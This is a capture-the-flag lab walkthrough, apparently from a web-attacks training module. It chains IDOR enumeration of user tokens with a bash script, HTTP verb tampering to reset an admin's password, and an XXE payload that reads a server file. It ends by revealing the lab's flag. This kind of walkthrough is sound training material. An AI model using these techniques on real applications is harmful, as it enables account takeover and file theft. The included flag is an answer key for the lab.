## Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

The login details are provided in the question below.

Let's visit the web application:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217220549.png)

We can authenticate now:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217220617.png)
## Identifying IDOR
---

We get sent to this dashboard, we can see settings, messages, invites, events, account settings and statistics, if we go to `settings`, we can see this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217220735.png)

We can change our password here, let's try sending a request to burp to analyze it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217221231.png)

We get an api call to `token/74`, also, we are assigned a cookie and an `uid`, in this case, we are assigned with `uid=74`, viewing the structure of the api call, we can see that the uid is strictly related to the token, let's try changing it to another uid to check the behavior:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217221356.png)

For example, if we change it to 1, we get that token, that token is necessary for the following:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217221433.png)

We can see that the `reset.php` function needs the token to function, since we can enumerate the tokens for other uids rather than ours, but, how do we even know which one is meant for admin user since we can only know tokens, that's when we need to go to our `HTTP History`, in there, we can check another `GET` request being made to `/api.php/user/`:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217222105.png)

Since this behaves exactly like the token request, we can change the uid and token call to check other users, for example, with number 1:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217222149.png)

## Enumerating Admin User
Now, it's time to automatize the uid search, let's begin with this bash script to enumerate users and view the uid of the admin user:

```bash
#!/bin/bash

# Target URL
TARGET="http://IP:PORT/api.php/user/"

# User-Agent
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"

# Output file
OUTPUT_FILE="idor_results.txt"

# Clear previous results
> "$OUTPUT_FILE"

# Colored output
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Loop through user IDs
for uid in {1..100}; do
    RESPONSE=$(curl -s "$TARGET$uid" -H "User-Agent: $USER_AGENT")
    
    if echo "$RESPONSE" | grep -iq "admin"; then
        echo -e "${GREEN}[+] Admin Found! UID: $uid${RESET}"
        echo "$RESPONSE" | tee -a "$OUTPUT_FILE"
    fi

done

echo -e "${GREEN}[+] Enumeration complete. Results saved to $OUTPUT_FILE${RESET}"

```

After a bit, we get the following:

```bash
[+] Admin Found! UID: 52

{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

We found the right uid, let's visualize the token:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230027.png)

Our admin token is:

```
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

If we try to reset the password, this happens:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230135.png)

We're getting `Access Denied`, we can bypass this restriction with `HTTP Verb Tampering`.

## HTTP Verb Tampering
---

To begin with, change the request to `PUT`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230238.png)

Now we get something different, let's adjust the parameters:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230311.png)

And now we were able to successfully change the password using `PUT` verb, we can now log as the admin user:

```ad-note
`a.corrales`:`test`
```

## Identifying Admin Functionalities
----

Nice, we are now inside the admin panel and we got a new functionality: `Add Event`, let's check the request for this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230553.png)

Let's create a simple test event:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230641.png)

Now, check the request:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230722.png)

We have a XML form, if we send the request, this is the response we're given:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230757.png)

It seems like the `name` property gets injected directly to the response, let's change it to something else and check:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217230848.png)

If we inject `whoami`, we can see it indeed goes through, we do not get the output of the command but it helps us understand that it gets reflected in the response:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217231014.png)

Now, knowing this, we can try exploiting XXE.

## Exploiting XXE
---

We can read the contents of our flag using the following payload:

```xml
<!DOCTYPE name [

  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">

]>
            <root>
            <name>&xxe;</name>
            <details>1</details>
            <date>0001-11-11</date>
            </root>
```

In this case, since we know the `name` is vulnerable, we can define an entity and then use it, this displays the following:

```
HTTP/1.1 200 OK

Date: Tue, 18 Feb 2025 04:41:32 GMT

Server: Apache/2.4.41 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
```

We got the flag in base64, we can even use burp's decoder to quickly decode that:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250217234359.png)

That outputs:

```
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

Flag is: 

```
HTB{m4573r_w3b_4774ck3r}
```
